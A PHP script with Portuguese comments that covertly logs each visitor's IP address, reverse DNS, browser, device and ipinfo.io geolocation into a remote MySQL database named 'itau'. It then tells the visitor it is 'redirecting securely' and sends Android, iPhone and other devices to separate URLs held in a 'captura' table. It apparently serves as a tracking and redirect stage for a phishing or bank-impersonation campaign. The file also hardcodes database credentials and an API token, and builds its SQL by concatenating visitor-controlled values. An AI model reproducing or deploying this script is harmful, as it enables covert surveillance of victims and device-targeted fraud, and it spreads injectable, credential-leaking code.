<?php
// capturar_ip.php

// Função para obter o endereço IP do usuário
function getUserIP() {
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if (filter_var($client, FILTER_VALIDATE_IP)) {
        $ip = $client;
    } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
        $ip = $forward;
    } else {
        $ip = $remote;
    }

    return $ip;
}

// Função para obter a marca e o modelo do dispositivo
function getDevice($user_agent) {
    $device = "Dispositivo Windows";
    if (preg_match('/(iPhone|iPad|iPod).*OS\s([\d_]+)/', $user_agent, $matches)) {
        $device = $matches[1] . " iOS " . str_replace('_', '.', $matches[2]);
    } elseif (preg_match('/Android.*([\d.]+);\s(.+)\sBuild/', $user_agent, $matches)) {
        $device = $matches[2] . " Android " . $matches[1];
    }
    return $device;
}

// Função para obter informações organizadas sobre o navegador
function getBrowserInfo($user_agent) {
    $browser = "Navegador Desconhecido";
    if (preg_match('/MSIE\s([\d.]+)/', $user_agent, $matches)) {
        $browser = "Internet Explorer " . $matches[1];
    } elseif (preg_match('/Trident.*rv:([\d.]+)/', $user_agent, $matches)) {
        $browser = "Internet Explorer " . $matches[1];
    } elseif (preg_match('/Edge\/([\d.]+)/', $user_agent, $matches)) {
        $browser = "Microsoft Edge " . $matches[1];
    } elseif (preg_match('/Chrome\/([\d.]+)/', $user_agent, $matches)) {
        $browser = "Google Chrome " . $matches[1];
    } elseif (preg_match('/Firefox\/([\d.]+)/', $user_agent, $matches)) {
        $browser = "Mozilla Firefox " . $matches[1];
    } elseif (preg_match('/Safari\/([\d.]+)/', $user_agent, $matches)) {
        $browser = "Safari " . $matches[1];
    }
    return $browser;
}

// Obter IP, reverso, navegador, marca e modelo do dispositivo
$ip = getUserIP();
$reverso = gethostbyaddr($ip);
$browser = getBrowserInfo($_SERVER['HTTP_USER_AGENT']);
$device = getDevice($_SERVER['HTTP_USER_AGENT']);

function getIPDetails($ip) {
    $access_key = '6b6eed6bb2a661'; // Insira sua chave de acesso aqui
    $url = "https://ipinfo.io/{$ip}?token={$access_key}";
    $response = file_get_contents($url);
    $data = json_decode($response, true);
    return $data;
}

// Obter a data atual no formato brasileiro
date_default_timezone_set('America/Sao_Paulo');
$data_atual = date('d/m/Y');

$servername = "competent-banzai.67-205-175-62.plesk.page:3306"; // insira o endereço do servidor MySQL aqui
$username = "tecnologia"; // insira o nome de usuário do MySQL aqui
$password = "tecnologia100@"; // insira a senha do MySQL aqui
$dbname = "itau"; // insira o nome do banco de dados MySQL aqui

// Cria conexão com o banco de dados
$conn = new mysqli($servername, $username, $password, $dbname);

// Verifica conexão
if ($conn->connect_error) {
    die("Tente novamente. " . $conn->connect_error);
}

// Obter informações adicionais a partir do IP
$ip_details = getIPDetails($ip);
$loc = explode(',', $ip_details['loc']);
$latitude = $loc[0];
$longitude = $loc[1];
$provedor = $ip_details['org'];
$cidade = $ip_details['city'];
$estado = $ip_details['region'];

// Prepara uma instrução SQL para inserção de dados
$sql = "INSERT INTO dados (data_atual, ip, reverso, browser, device, latitude, longitude, provedor, cidade, estado)
VALUES ('$data_atual', '$ip', '$reverso', '$browser', '$device', '$latitude', '$longitude', '$provedor', '$cidade', '$estado')";

if ($conn->query($sql) === TRUE) {
    echo "Redirecionando com segurança.";
} else {
    echo "Tente novamente. " . $conn->error;
}

// Query para buscar as URLs no banco de dados
$sql = "SELECT url_android, url_iphone, url_generic FROM captura";
$result = $conn->query($sql);

// Armazena as URLs em variáveis PHP
if ($result->num_rows > 0) {
    $row = $result->fetch_assoc();
    $url_android = $row["url_android"];
    $url_iphone = $row["url_iphone"];
    $url_generic = $row["url_generic"];
}

// Fecha a conexão com o banco de dados
$conn->close();

// Redireciona o usuário de acordo com o tipo de dispositivo
$user_agent = $_SERVER['HTTP_USER_AGENT'];

if (strpos($user_agent, 'Android') !== false) {
    header("Location: $url_android");
    exit;
} elseif (strpos($user_agent, 'iPhone') !== false) {
    header("Location: $url_iphone");
    exit;
} else {
    header("Location: $url_generic");
    exit;
}

?>